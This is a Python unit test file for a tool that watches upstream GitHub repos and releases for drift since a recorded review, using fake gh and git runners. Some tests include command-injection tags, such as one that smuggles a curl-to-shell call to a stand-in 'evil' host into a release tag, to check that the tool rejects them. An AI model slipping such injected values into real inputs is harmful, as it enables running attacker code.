#!/usr/bin/env python3
"""Unit tests for tools/upstream_watch.py.

Run:  python -B -m unittest tools.tests.test_upstream_watch

The gh runner, the git runner and the clock are injected, so no test touches the network, a
clone or the real cache file.
"""
import contextlib
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

TOOLS = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, TOOLS)

import upstream_watch as uw  # noqa: E402

SHA_A = "784fef931e049ea9e53a2280a34667d05b819cd6"
SHA_B = "2ff002be3013acbaff20a881ee7c1480fad9fa0e"
NOW = 1_800_000_000.0

ENTRY = {
    "repo": "yotthani/bannerlord",
    "reviewed": SHA_A,
    "reviewed_on": "2026-10-15",
    "record": "docs/reviews/adopt-yotthani-2026-10-15.md",
    "feature_paths": ["HoN/DualWield", "RealmUI", "docs/realm-ui"],
}


def state_with(*entries):
    return {"version": 1, "repos": list(entries)}


class FakeGh:
    """Records calls; answers from a canned (rc, out, err) or raises a canned exception."""

    def __init__(self, result=None, raises=None):
        self.result = result
        self.raises = raises
        self.calls = []

    def __call__(self, args, timeout):
        self.calls.append((list(args), timeout))
        if self.raises is not None:
            raise self.raises
        return self.result


class FakeClock:
    """A monotonic clock that only moves when a test says so."""

    def __init__(self):
        self.t = 1000.0

    def __call__(self):
        return self.t


def compare_reply(ahead, head="2ff002b"):
    url = "https://github.com/yotthani/bannerlord/compare/yotthani:784fef9...yotthani:%s" % head
    body = json.dumps({"ahead_by": ahead, "status": "ahead" if ahead else "identical", "permalink_url": url})
    return (0, body, "")


class TempFiles(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.state_path = os.path.join(self.tmp.name, "upstream-watch.json")
        self.cache_path = os.path.join(self.tmp.name, "cache", "cache.json")

    def write_state(self, data):
        with open(self.state_path, "w", encoding="utf-8", newline="\n") as f:
            f.write(data if isinstance(data, str) else json.dumps(data))

    def run_status(self, gh, brief=True, max_age=20.0, now=NOW, budget=None, mono=None):
        out = io.StringIO()
        code = uw.run_status(self.state_path, self.cache_path, brief, max_age, gh, lambda: now, out,
                             budget=budget, monotonic=mono or FakeClock())
        return code, out.getvalue()

    def cache_text(self):
        with open(self.cache_path, encoding="utf-8") as f:
            return f.read()


class StatusTests(TempFiles):
    def test_ahead_prints_one_line_with_record(self):
        self.write_state(state_with(ENTRY))
        gh = FakeGh(compare_reply(295))
        code, out = self.run_status(gh)
        self.assertEqual(code, 0)
        self.assertEqual(
            out,
            "UPSTREAM AHEAD: yotthani/bannerlord has 295 new commits since the 2026-10-15 review "
            "(record docs/reviews/adopt-yotthani-2026-10-15.md); run /upstream-review\n",
        )
        self.assertEqual(len(gh.calls), 1)

    def test_one_commit_is_singular(self):
        self.write_state(state_with(ENTRY))
        code, out = self.run_status(FakeGh(compare_reply(1)))
        self.assertIn("has 1 new commit since", out)

    def test_current_prints_nothing(self):
        self.write_state(state_with(ENTRY))
        code, out = self.run_status(FakeGh(compare_reply(0)))
        self.assertEqual((code, out), (0, ""))

    def test_gh_call_is_short_and_read_only(self):
        self.write_state(state_with(ENTRY))
        gh = FakeGh(compare_reply(3))
        self.run_status(gh)
        args, timeout = gh.calls[0]
        # page 2 of a one-per-page compare omits the 300-file patch list (11 KB, not 1.25 MB) and keeps
        # ahead_by and the permalink. Any -f, -F or --input would make gh POST, so the args are exact.
        self.assertEqual(args, ["api", "repos/yotthani/bannerlord/compare/%s...HEAD?per_page=1&page=2" % SHA_A])
        self.assertEqual(timeout, uw.GH_TIMEOUT)
        self.assertEqual(uw.GH_TIMEOUT, 2.5)

    def test_fresh_cache_skips_gh(self):
        self.write_state(state_with(ENTRY))
        self.run_status(FakeGh(compare_reply(5)))
        gh = FakeGh(raises=AssertionError("must not call gh"))
        code, out = self.run_status(gh, now=NOW + 3600)
        self.assertEqual(gh.calls, [])
        self.assertIn("has 5 new commits", out)

    def test_stale_cache_calls_gh_again(self):
        self.write_state(state_with(ENTRY))
        self.run_status(FakeGh(compare_reply(5)))
        gh = FakeGh(compare_reply(7))
        code, out = self.run_status(gh, now=NOW + 21 * 3600)
        self.assertEqual(len(gh.calls), 1)
        self.assertIn("has 7 new commits", out)

    def test_cache_for_an_older_reviewed_sha_is_ignored(self):
        self.write_state(state_with(ENTRY))
        self.run_status(FakeGh(compare_reply(5)))
        moved = dict(ENTRY, reviewed=SHA_B)
        self.write_state(state_with(moved))
        gh = FakeGh(compare_reply(0))
        code, out = self.run_status(gh, now=NOW + 60)
        self.assertEqual(len(gh.calls), 1)
        self.assertEqual(out, "")

    def test_timeout_is_unchecked_and_exits_zero(self):
        self.write_state(state_with(ENTRY))
        gh = FakeGh(raises=subprocess.TimeoutExpired(["gh"], 4))
        code, out = self.run_status(gh)
        self.assertEqual(code, 0)
        self.assertEqual(out.count("\n"), 1)
        self.assertIn("UNCHECKED this session (", out)
        self.assertIn("slow", out)

    def test_gh_missing_is_unchecked(self):
        self.write_state(state_with(ENTRY))
        code, out = self.run_status(FakeGh(raises=FileNotFoundError("gh")))
        self.assertEqual(code, 0)
        self.assertIn("UNCHECKED this session (", out)
        self.assertIn("gh not installed", out)

    def test_gh_not_logged_in_is_unchecked(self):
        self.write_state(state_with(ENTRY))
        gh = FakeGh((4, "", "To get started with GitHub CLI, please run:  gh auth login"))
        code, out = self.run_status(gh)
        self.assertEqual(code, 0)
        self.assertIn("gh not logged in", out)

    def test_network_error_is_unchecked(self):
        self.write_state(state_with(ENTRY))
        gh = FakeGh((1, "", "error connecting to api.github.com"))
        code, out = self.run_status(gh)
        self.assertEqual(code, 0)
        self.assertIn("UNCHECKED this session (", out)

    def test_two_repos_stop_calling_after_a_systemic_failure(self):
        other = dict(ENTRY, repo="yotthani/MithrilForge")
        self.write_state(state_with(ENTRY, other))
        gh = FakeGh(raises=subprocess.TimeoutExpired(["gh"], 4))
        code, out = self.run_status(gh)
        self.assertEqual(len(gh.calls), 1)
        self.assertEqual(out.count("NOTE:"), 1)

    def test_one_repo_ahead_one_current(self):
        other = dict(ENTRY, repo="yotthani/MithrilForge")
        self.write_state(state_with(ENTRY, other))

        def gh(args, timeout):
            return compare_reply(2) if "yotthani/MithrilForge" in " ".join(args) else compare_reply(0)

        code, out = self.run_status(gh)
        self.assertEqual(out.count("\n"), 1)
        self.assertIn("yotthani/MithrilForge has 2 new commits", out)

    def test_malformed_state_brief_is_a_note_not_a_crash(self):
        self.write_state("{ not json")
        code, out = self.run_status(FakeGh(compare_reply(1)))
        self.assertEqual(code, 0)
        self.assertIn("UNCHECKED this session (", out)
        self.assertIn("state file", out)

    def test_malformed_state_full_exits_two(self):
        self.write_state(json.dumps({"version": 1, "repos": [{"repo": "x/y", "reviewed": "nope"}]}))
        code, out = self.run_status(FakeGh(compare_reply(1)), brief=False)
        self.assertEqual(code, 2)

    def test_missing_state_file_is_unchecked(self):
        code, out = self.run_status(FakeGh(compare_reply(1)))
        self.assertEqual(code, 0)
        self.assertIn("state file", out)

    def test_full_status_exit_codes_and_table(self):
        self.write_state(state_with(ENTRY))
        code, out = self.run_status(FakeGh(compare_reply(4)), brief=False)
        self.assertEqual(code, 1)
        self.assertIn("yotthani/bannerlord", out)
        self.assertIn("2ff002b", out)
        code, out = self.run_status(FakeGh(compare_reply(0)), brief=False, now=NOW + 40 * 3600)
        self.assertEqual(code, 0)

    def test_full_mode_unexpected_error_exits_three_with_traceback(self):
        self.write_state(state_with(ENTRY))
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            code, out = self.run_status(FakeGh(raises=RuntimeError("boom")), brief=False)
        self.assertEqual(code, 3)
        self.assertIn("NOTE: upstream review drift UNCHECKED this session (unexpected error: RuntimeError)", out)
        self.assertIn("Traceback", err.getvalue())
        self.assertIn("boom", err.getvalue())

    def test_full_mode_gh_timeout_with_no_cache_exits_three(self):
        # The skill's P1 branches on this exit: 3 means unchecked, never "nothing new".
        self.write_state(state_with(ENTRY))
        code, out = self.run_status(FakeGh(raises=subprocess.TimeoutExpired(["gh"], 2.5)), brief=False)
        self.assertEqual(code, 3)
        self.assertIn("NOTE: upstream review drift UNCHECKED this session (", out)

    def test_brief_unexpected_error_exits_zero(self):
        self.write_state(state_with(ENTRY))
        code, out = self.run_status(FakeGh(raises=RuntimeError("boom")))
        self.assertEqual(code, 0)
        self.assertIn("unexpected error", out)

    def test_stale_cache_is_used_when_gh_fails(self):
        self.write_state(state_with(ENTRY))
        self.run_status(FakeGh(compare_reply(5)))
        code, out = self.run_status(FakeGh(raises=subprocess.TimeoutExpired(["gh"], 2.5)), brief=False,
                                    now=NOW + 30 * 3600)
        self.assertEqual(code, 1)
        self.assertIn("ahead 5  [stale cache]", out)
        self.assertIn("UNCHECKED", out)

    def test_cache_is_saved_only_when_a_live_answer_arrived(self):
        self.write_state(state_with(ENTRY))
        self.run_status(FakeGh(raises=subprocess.TimeoutExpired(["gh"], 2.5)))
        self.assertFalse(os.path.exists(self.cache_path))
        self.run_status(FakeGh(compare_reply(5)))
        before = self.cache_text()
        os.utime(self.cache_path, (1, 1))
        self.run_status(FakeGh(raises=AssertionError("must not call gh")), now=NOW + 60)
        self.assertEqual(os.stat(self.cache_path).st_mtime, 1)  # a cached run rewrites nothing
        self.run_status(FakeGh(raises=subprocess.TimeoutExpired(["gh"], 2.5)), now=NOW + 30 * 3600)
        self.assertEqual(os.stat(self.cache_path).st_mtime, 1)  # neither does a failed one
        self.assertEqual(self.cache_text(), before)

    def test_cache_is_saved_after_each_live_answer(self):
        other = dict(ENTRY, repo="yotthani/MithrilForge")
        self.write_state(state_with(ENTRY, other))

        def gh(args, timeout):
            if "MithrilForge" in args[1]:
                raise subprocess.TimeoutExpired(["gh"], timeout)
            return compare_reply(4)

        self.run_status(gh)
        saved = json.loads(self.cache_text())["repos"]
        self.assertEqual(list(saved), ["yotthani/bannerlord"])

    def test_cache_entry_without_a_numeric_checked_at_is_no_cache(self):
        self.write_state(state_with(ENTRY))
        for bad in (None, "2026-10-16", True, [1]):
            os.makedirs(os.path.dirname(self.cache_path), exist_ok=True)
            entry = {"reviewed": SHA_A, "ahead": 9, "head": "abc"}
            if bad is not None:
                entry["checked_at"] = bad
            with open(self.cache_path, "w", encoding="utf-8") as f:
                json.dump({"repos": {ENTRY["repo"]: entry}}, f)
            gh = FakeGh(compare_reply(2))
            code, out = self.run_status(gh)
            self.assertEqual(len(gh.calls), 1, bad)
            self.assertIn("has 2 new commits", out)

    def test_cache_entry_with_a_float_checked_at_is_used(self):
        self.write_state(state_with(ENTRY))
        os.makedirs(os.path.dirname(self.cache_path))
        with open(self.cache_path, "w", encoding="utf-8") as f:
            json.dump({"repos": {ENTRY["repo"]: {"reviewed": SHA_A, "ahead": 9, "head": "abc",
                                                 "checked_at": NOW - 60.5}}}, f)
        gh = FakeGh(raises=AssertionError("must not call gh"))
        code, out = self.run_status(gh)
        self.assertIn("has 9 new commits", out)

    def test_a_404_on_one_repo_still_checks_the_next(self):
        other = dict(ENTRY, repo="yotthani/MithrilForge")
        self.write_state(state_with(ENTRY, other))

        def gh(args, timeout):
            if "yotthani/bannerlord" in args[1]:
                return (1, "", "gh: Not Found (HTTP 404)")
            return compare_reply(2)

        code, out = self.run_status(gh)
        self.assertEqual(code, 0)
        self.assertIn("yotthani/MithrilForge has 2 new commits", out)
        self.assertIn("yotthani/bannerlord: gh: Not Found (HTTP 404); the reviewed SHA or the repo is gone "
                      "upstream (re-seed it with advance), or this gh login lost access to the repo", out)

    def test_a_422_is_also_that_repos_problem(self):
        other = dict(ENTRY, repo="yotthani/MithrilForge")
        self.write_state(state_with(ENTRY, other))
        calls = []

        def gh(args, timeout):
            calls.append(args)
            if len(calls) == 1:
                return (1, "", "gh: No common ancestor (HTTP 422)")
            return compare_reply(0)

        self.run_status(gh)
        self.assertEqual(len(calls), 2)

    def test_budget_caps_each_call_and_is_not_exceeded(self):
        self.write_state(state_with(ENTRY))
        gh = FakeGh(compare_reply(1))
        self.run_status(gh, budget=5.0)
        self.assertEqual(gh.calls[0][1], 2.5)
        os.remove(self.cache_path)
        gh = FakeGh(compare_reply(1))
        self.run_status(gh, budget=1.0)
        self.assertAlmostEqual(gh.calls[0][1], 0.7)

    def test_budget_under_half_a_second_makes_no_call(self):
        self.write_state(state_with(ENTRY))
        gh = FakeGh(raises=AssertionError("must not call gh"))
        code, out = self.run_status(gh, budget=0.4)
        self.assertEqual(code, 0)
        self.assertIn("time budget spent", out)
        self.assertEqual(gh.calls, [])

    def test_budget_spent_by_the_first_repo_stops_the_second(self):
        other = dict(ENTRY, repo="yotthani/MithrilForge")
        self.write_state(state_with(ENTRY, other))
        clock = FakeClock()
        calls = []

        def gh(args, timeout):
            calls.append(args)
            clock.t += 2.0
            return compare_reply(3)

        code, out = self.run_status(gh, budget=2.4, mono=clock)
        self.assertEqual(len(calls), 1)
        self.assertIn("yotthani/bannerlord has 3 new commits", out)
        self.assertIn("time budget spent", out)
        self.assertEqual(list(json.loads(self.cache_text())["repos"]), ["yotthani/bannerlord"])

    def test_corrupt_cache_is_ignored(self):
        self.write_state(state_with(ENTRY))
        os.makedirs(os.path.dirname(self.cache_path))
        with open(self.cache_path, "w") as f:
            f.write("garbage")
        code, out = self.run_status(FakeGh(compare_reply(2)))
        self.assertIn("has 2 new commits", out)


class LoadStateTests(TempFiles):
    def test_valid_state_loads(self):
        self.write_state(state_with(ENTRY))
        self.assertEqual(uw.load_state(self.state_path)["repos"][0]["repo"], "yotthani/bannerlord")

    def test_seeded_state_file_is_valid(self):
        seeded = os.path.join(os.path.dirname(TOOLS), "docs", "reviews", "upstream-watch.json")
        state = uw.load_state(seeded)
        self.assertEqual([r["repo"] for r in state["repos"]], ["yotthani/bannerlord", "yotthani/MithrilForge"])
        for r in state["repos"] + state.get("releases", []):
            self.assertTrue(os.path.isfile(os.path.join(os.path.dirname(TOOLS), r["record"])), r["record"])
        self.assertEqual([r["repo"] for r in state["releases"]], ["Bannerlord-Coop-Team/BannerlordCoop"])

    def test_bad_sha_rejected(self):
        self.write_state(state_with(dict(ENTRY, reviewed="abc123")))
        with self.assertRaises(uw.StateError):
            uw.load_state(self.state_path)

    def test_missing_field_rejected(self):
        bad = dict(ENTRY)
        del bad["record"]
        self.write_state(state_with(bad))
        with self.assertRaises(uw.StateError):
            uw.load_state(self.state_path)

    def test_top_level_not_object_rejected(self):
        self.write_state("[]")
        with self.assertRaises(uw.StateError):
            uw.load_state(self.state_path)

    def test_duplicate_repo_rejected(self):
        self.write_state(state_with(ENTRY, ENTRY))
        with self.assertRaises(uw.StateError):
            uw.load_state(self.state_path)

    def test_empty_repos_rejected(self):
        self.write_state({"version": 1, "repos": []})
        with self.assertRaises(uw.StateError) as ctx:
            uw.load_state(self.state_path)
        self.assertIn("lists no repos, so nothing would be checked", str(ctx.exception))

    def test_trailing_newline_in_a_name_or_sha_rejected(self):
        for bad in (dict(ENTRY, repo="yotthani/bannerlord\n"), dict(ENTRY, reviewed=SHA_A + "\n"),
                    dict(ENTRY, repo="yotthani/b\u00e4nner")):
            self.write_state(state_with(bad))
            with self.assertRaises(uw.StateError):
                uw.load_state(self.state_path)


RELEASE = {
    "repo": "Bannerlord-Coop-Team/BannerlordCoop",
    "seen": "v0.1.7",
    "seen_on": "2026-10-30",
    "record": "docs/features/coop-interop.md",
}


def release_reply(tag):
    return (0, json.dumps({"tag_name": tag, "published_at": "2026-10-30T21:47:48Z", "prerelease": False}), "")


class RouterGh:
    """Answers by endpoint: the commit compare and the latest-release read are different calls. `release`
    is one reply, or a dict of repo name to reply; `release_raises` fails only the release reads;
    `clock` and `step` move a FakeClock by `step` seconds on each compare call."""

    def __init__(self, compare=None, release=None, raises=None, release_raises=None, clock=None, step=0.0):
        self.compare, self.release, self.raises = compare, release, raises
        self.release_raises, self.clock, self.step = release_raises, clock, step
        self.calls = []

    def __call__(self, args, timeout):
        self.calls.append((list(args), timeout))
        if self.raises is not None:
            raise self.raises
        if args[1].endswith("/releases/latest"):
            if self.release_raises is not None:
                raise self.release_raises
            if isinstance(self.release, dict):
                return next(v for k, v in self.release.items() if "repos/%s/" % k in args[1])
            return self.release
        if self.clock is not None:
            self.clock.t += self.step
        return self.compare


def state_with_release(*releases, repos=(ENTRY,)):
    return {"version": 1, "repos": list(repos), "releases": list(releases)}


class ReleaseStatusTests(TempFiles):
    def test_new_release_prints_one_line_naming_the_record_and_the_seen_command(self):
        self.write_state(state_with_release(RELEASE))
        code, out = self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.8")))
        self.assertEqual(code, 0)
        self.assertEqual(
            out,
            "UPSTREAM RELEASE: Bannerlord-Coop-Team/BannerlordCoop published v0.1.8 (last seen v0.1.7 on "
            "2026-10-30; record docs/features/coop-interop.md); update the record, then run "
            "python tools/upstream_watch.py seen --repo Bannerlord-Coop-Team/BannerlordCoop --tag v0.1.8\n",
        )

    def test_the_seen_release_prints_nothing(self):
        self.write_state(state_with_release(RELEASE))
        self.assertEqual(self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.7"))), (0, ""))

    def test_release_call_is_one_read_only_get(self):
        self.write_state(state_with_release(RELEASE))
        gh = RouterGh(compare_reply(0), release_reply("v0.1.7"))
        self.run_status(gh)
        self.assertEqual(gh.calls[-1][0], ["api", "repos/Bannerlord-Coop-Team/BannerlordCoop/releases/latest"])
        self.assertEqual(len(gh.calls), 2)

    def test_fresh_release_cache_skips_gh(self):
        self.write_state(state_with_release(RELEASE))
        self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.8")))
        gh = RouterGh(raises=AssertionError("must not call gh"))
        code, out = self.run_status(gh, now=NOW + 3600)
        self.assertEqual(gh.calls, [])
        self.assertIn("published v0.1.8", out)

    def test_cached_tag_is_judged_against_the_current_seen(self):
        self.write_state(state_with_release(RELEASE))
        self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.8")))
        self.write_state(state_with_release(dict(RELEASE, seen="v0.1.8")))
        code, out = self.run_status(RouterGh(raises=AssertionError("must not call gh")), now=NOW + 60)
        self.assertEqual((code, out), (0, ""))

    def test_a_404_is_that_repos_problem_and_says_so(self):
        self.write_state(state_with_release(RELEASE))
        code, out = self.run_status(RouterGh(compare_reply(2), (1, "", "gh: Not Found (HTTP 404)")))
        self.assertIn("UPSTREAM AHEAD: yotthani/bannerlord has 2 new commits", out)
        self.assertIn("NOTE: upstream review drift UNCHECKED this session (Bannerlord-Coop-Team/BannerlordCoop release:", out)
        self.assertIn("no published release", out)

    def test_a_systemic_gh_failure_stops_the_release_checks_too(self):
        self.write_state(state_with_release(RELEASE))
        gh = RouterGh(raises=FileNotFoundError())
        code, out = self.run_status(gh)
        self.assertEqual(len(gh.calls), 1)
        self.assertEqual(out, "NOTE: upstream review drift UNCHECKED this session (gh not installed)\n")

    def test_full_status_lists_the_release_and_a_new_one_exits_one(self):
        self.write_state(state_with_release(RELEASE))
        code, out = self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.8")), brief=False)
        self.assertEqual(code, 1)
        self.assertIn("Bannerlord-Coop-Team/BannerlordCoop  release seen v0.1.7 (2026-10-30)  latest v0.1.8  [live]", out)

    def test_a_non_plain_tag_is_that_repos_problem_and_never_printed_as_a_command(self):
        self.write_state(state_with_release(RELEASE))
        code, out = self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.8;curl${IFS}evil|sh")))
        self.assertNotIn("UPSTREAM RELEASE", out)
        self.assertNotIn("curl", out)
        self.assertIn("Bannerlord-Coop-Team/BannerlordCoop", out)
        self.assertIn("not a plain tag", out)

    def test_plain_tags_of_real_shapes_are_accepted(self):
        for tag in ("v0.1.7", "v1.0.0-beta.1", "1.2.3+build.5", "release/1.0"):
            with self.subTest(tag=tag):
                self.assertTrue(uw.TAG_RE.fullmatch(tag))
        for tag in ("v1;id", "v1$(id)", "v1`id`", "v1&&echo", "v1>out", "-v1", "v\u202e1", "v" * 101):
            with self.subTest(tag=tag):
                self.assertIsNone(uw.TAG_RE.fullmatch(tag))

    def test_release_read_failure_after_a_live_compare_names_the_release(self):
        self.write_state(state_with_release(RELEASE))
        gh = RouterGh(compare_reply(0), release_raises=subprocess.TimeoutExpired("gh", 2.5))
        code, out = self.run_status(gh)
        self.assertEqual(code, 0)
        self.assertIn("Bannerlord-Coop-Team/BannerlordCoop release: gh slow", out)

    def test_malformed_release_answer_is_unchecked_and_names_the_release(self):
        for body in ("{}", "[]", json.dumps({"tag_name": 7})):
            with self.subTest(body=body):
                self.write_state(state_with_release(RELEASE))
                if os.path.exists(self.cache_path):
                    os.remove(self.cache_path)
                code, out = self.run_status(RouterGh(compare_reply(0), (0, body, "")))
                self.assertIn("Bannerlord-Coop-Team/BannerlordCoop release: unexpected gh answer", out)

    def test_budget_spent_by_the_compare_skips_the_release_read(self):
        self.write_state(state_with_release(RELEASE))
        clock = FakeClock()
        gh = RouterGh(compare_reply(0), release_reply("v0.1.8"), clock=clock, step=1.0)
        code, out = self.run_status(gh, budget=1.2, mono=clock)
        self.assertEqual(len(gh.calls), 1)
        self.assertIn("time budget spent", out)

    def test_stale_release_cache_is_used_when_gh_fails(self):
        self.write_state(state_with_release(RELEASE))
        self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.8")))
        code, out = self.run_status(RouterGh(raises=FileNotFoundError()), brief=False, now=NOW + 21 * 3600)
        self.assertEqual(code, 1)
        self.assertIn("latest v0.1.8  [stale cache]", out)

    def test_malformed_release_cache_entry_is_no_cache(self):
        self.write_state(state_with_release(RELEASE))
        os.makedirs(os.path.dirname(self.cache_path), exist_ok=True)
        for entry in ({"tag": "v1;id", "checked_at": NOW}, {"tag": "v0.1.8", "checked_at": "now"}, ["v0.1.8"]):
            with self.subTest(entry=entry):
                with open(self.cache_path, "w", encoding="utf-8") as f:
                    json.dump({"repos": {"release:" + RELEASE["repo"]: entry}}, f)
                gh = RouterGh(compare_reply(0), release_reply("v0.1.7"))
                self.run_status(gh)
                self.assertEqual(len(gh.calls), 2)

    def test_a_404_on_one_release_still_reads_the_next(self):
        other = dict(RELEASE, repo="someone/else")
        self.write_state(state_with_release(RELEASE, other))
        gh = RouterGh(compare_reply(0), {RELEASE["repo"]: (1, "", "gh: Not Found (HTTP 404)"),
                                         "someone/else": release_reply("v9")})
        code, out = self.run_status(gh)
        self.assertIn("UPSTREAM RELEASE: someone/else published v9", out)
        self.assertIn("Bannerlord-Coop-Team/BannerlordCoop release:", out)
        self.assertIn("no published release", out)

    def test_full_status_with_the_release_seen_exits_zero(self):
        self.write_state(state_with_release(RELEASE))
        code, _ = self.run_status(RouterGh(compare_reply(0), release_reply("v0.1.7")), brief=False)
        self.assertEqual(code, 0)


class ReleaseStateTests(TempFiles):
    def load(self, data):
        self.write_state(data)
        return uw.load_state(self.state_path)

    def test_state_without_releases_still_loads(self):
        self.assertNotIn("releases", self.load(state_with(ENTRY)))

    def test_releases_must_be_a_list(self):
        with self.assertRaises(uw.StateError):
            self.load({"repos": [ENTRY], "releases": {}})

    def test_release_entry_needs_every_field(self):
        for field in ("repo", "seen", "seen_on", "record"):
            bad = dict(RELEASE)
            del bad[field]
            with self.subTest(field=field), self.assertRaises(uw.StateError):
                self.load(state_with_release(bad))

    def test_bad_release_values_are_rejected(self):
        for field, value in (("repo", "no-slash"), ("seen", ""), ("seen", "v 1"), ("seen_on", "30-10-2026"),
                             ("record", "")):
            with self.subTest(field=field, value=value), self.assertRaises(uw.StateError):
                self.load(state_with_release(dict(RELEASE, **{field: value})))

    def test_duplicate_release_repo_rejected(self):
        with self.assertRaises(uw.StateError):
            self.load(state_with_release(RELEASE, dict(RELEASE)))


class SeenTests(TempFiles):
    def setUp(self):
        super().setUp()
        self.write_state(state_with_release(RELEASE))

    def seen(self, repo=RELEASE["repo"], tag="v0.1.8", date="2026-11-02"):
        with contextlib.redirect_stderr(io.StringIO()):
            return uw.run_seen(self.state_path, repo, tag, date)

    def data(self):
        with open(self.state_path, encoding="utf-8") as f:
            return json.load(f)

    def test_seen_records_the_tag_and_date(self):
        self.assertEqual(self.seen(), 0)
        r = self.data()["releases"][0]
        self.assertEqual((r["seen"], r["seen_on"], r["record"]), ("v0.1.8", "2026-11-02", RELEASE["record"]))
        self.assertEqual(self.data()["repos"][0], ENTRY)

    def test_seen_rewrite_is_stable_lf_json(self):
        self.seen()
        with open(self.state_path, encoding="utf-8", newline="") as f:
            first = f.read()
        self.assertNotIn("\r", first)
        self.assertTrue(first.endswith("}\n"))
        self.seen()
        with open(self.state_path, encoding="utf-8", newline="") as f:
            self.assertEqual(f.read(), first)

    def test_invalid_input_leaves_the_file_untouched(self):
        with open(self.state_path, encoding="utf-8") as f:
            before = f.read()
        for kwargs in ({"repo": "nobody/else"}, {"tag": ""}, {"tag": "v 2"}, {"tag": "v1;id"},
                       {"date": "2026-13-40"}):
            with self.subTest(**kwargs):
                self.assertEqual(self.seen(**kwargs), 2)
        with open(self.state_path, encoding="utf-8") as f:
            self.assertEqual(f.read(), before)

    def test_cli_seen_reaches_run_seen(self):
        with mock.patch.object(uw, "run_seen", return_value=0) as run_seen:
            self.assertEqual(uw.main(["--state", self.state_path, "seen", "--repo", RELEASE["repo"],
                                      "--tag", "v0.1.8", "--date", "2026-11-02"]), 0)
        run_seen.assert_called_once_with(self.state_path, RELEASE["repo"], "v0.1.8", "2026-11-02")


class AreaTests(unittest.TestCase):
    FEATURES = ["HoN/DualWield", "HoN/Armory", "HoN/Armory.Tests", "RealmUI", "docs/realm-ui"]

    def area(self, path):
        return uw.area_of(path, self.FEATURES)

    def test_hon_project_is_its_own_area(self):
        self.assertEqual(self.area("HoN/Refuge/Foo.cs"), "HoN/Refuge")

    def test_top_level_dir(self):
        self.assertEqual(self.area("KoMModpack/x/y.xml"), "KoMModpack")

    def test_root_file(self):
        self.assertEqual(self.area(".gitignore"), "(root)")

    def test_feature_path_is_the_area(self):
        self.assertEqual(self.area("HoN/DualWield/a/b.cs"), "HoN/DualWield")
        self.assertEqual(self.area("RealmUI/x.xml"), "RealmUI")
        self.assertEqual(self.area("docs/realm-ui/notes.md"), "docs/realm-ui")

    def test_sibling_with_shared_prefix_is_not_a_feature(self):
        self.assertEqual(self.area("HoN/Armory_TAOM/x.cs"), "HoN/Armory_TAOM")
        self.assertFalse(uw.is_feature("HoN/Armory_TAOM", self.FEATURES))
        self.assertTrue(uw.is_feature("HoN/Armory", self.FEATURES))

    def test_rest_of_docs_stays_in_scope(self):
        self.assertEqual(self.area("docs/plans/p.md"), "docs")
        self.assertFalse(uw.is_feature("docs", self.FEATURES))

    def test_parse_log_groups_subjects_and_files(self):
        log = (
            "\x01aaa\x02Add dual wield\n\nHoN/DualWield/a.cs\nHoN/Refuge/b.cs\n"
            "\x01bbb\x02Fix refuge\n\nHoN/Refuge/c.cs\n"
        )
        commits = uw.parse_log(log)
        self.assertEqual([c["subject"] for c in commits], ["Add dual wield", "Fix refuge"])
        self.assertEqual(commits[0]["files"], ["HoN/DualWield/a.cs", "HoN/Refuge/b.cs"])

    def test_summarise_labels_feature_and_in_scope(self):
        commits = [
            {"sha": "a", "subject": "Add dual wield", "files": ["HoN/DualWield/a.cs", "HoN/Refuge/b.cs"]},
            {"sha": "b", "subject": "Fix refuge", "files": ["HoN/Refuge/c.cs"]},
        ]
        areas = uw.summarise(commits, ["HoN/DualWield"])
        by_name = {a["area"]: a for a in areas}
        self.assertEqual(by_name["HoN/DualWield"]["label"], "feature")
        self.assertEqual(by_name["HoN/Refuge"]["label"], "in scope")
        self.assertEqual(by_name["HoN/Refuge"]["files"], 2)
        self.assertEqual(by_name["HoN/Refuge"]["subjects"], ["Add dual wield", "Fix refuge"])
        self.assertEqual(by_name["HoN/DualWield"]["subjects"], ["Add dual wield"])
        self.assertEqual(areas[0]["area"], "HoN/Refuge")  # most files first

    def test_commits_column_counts_distinct_shas_not_subjects(self):
        commits = [
            {"sha": "a", "subject": "Fix refuge", "files": ["HoN/Refuge/a.cs"]},
            {"sha": "b", "subject": "Fix refuge", "files": ["HoN/Refuge/b.cs"]},
        ]
        row = uw.summarise(commits, [])[0]
        self.assertEqual(row["commits"], 2)
        self.assertEqual(row["subjects"], ["Fix refuge"])

    def test_markdown_brief_names_labels(self):
        areas = uw.summarise(
            [{"sha": "a", "subject": "Add dual wield", "files": ["HoN/DualWield/a.cs"]}], ["HoN/DualWield"]
        )
        md = uw.render_areas("yotthani/bannerlord", SHA_A, SHA_B, 1, areas)
        self.assertIn("| HoN/DualWield | feature | 1 | 1 |", md)
        self.assertIn("### HoN/DualWield (feature)", md)
        self.assertIn("- Add dual wield", md)


class FakeGit:
    def __init__(self, log="", tree=None):
        self.log = log
        self.tree = ENTRY["feature_paths"] if tree is None else tree
        self.calls = []

    def __call__(self, args, cwd=None):
        self.calls.append((list(args), cwd))
        if args and args[0] == "log":
            return (0, self.log, "")
        if args and args[0] == "rev-parse":
            return (0, SHA_B + "\n", "")
        if args and args[0] == "ls-tree":
            asked = args[args.index("--") + 1:]
            return (0, "".join(p + "\n" for p in asked if p in self.tree), "")
        return (0, "", "")


class AreasCommandTests(TempFiles):
    def setUp(self):
        super().setUp()
        self.write_state(state_with(ENTRY))
        self.log = "\x01" + SHA_B + "\x02Add dual wield\n\nHoN/DualWield/a.cs\n"

    def verbs(self, git):
        return [c[0][0] for c in git.calls]

    def test_new_dir_makes_a_blobless_no_checkout_clone(self):
        git = FakeGit(self.log)
        clone = os.path.join(self.tmp.name, "clone")
        out = io.StringIO()
        code = uw.run_areas(self.state_path, "yotthani/bannerlord", clone, None, git, out)
        self.assertEqual(code, 0)
        first = git.calls[0][0]
        self.assertEqual(first[0], "clone")
        self.assertIn("--filter=blob:none", first)
        self.assertIn("--no-checkout", first)
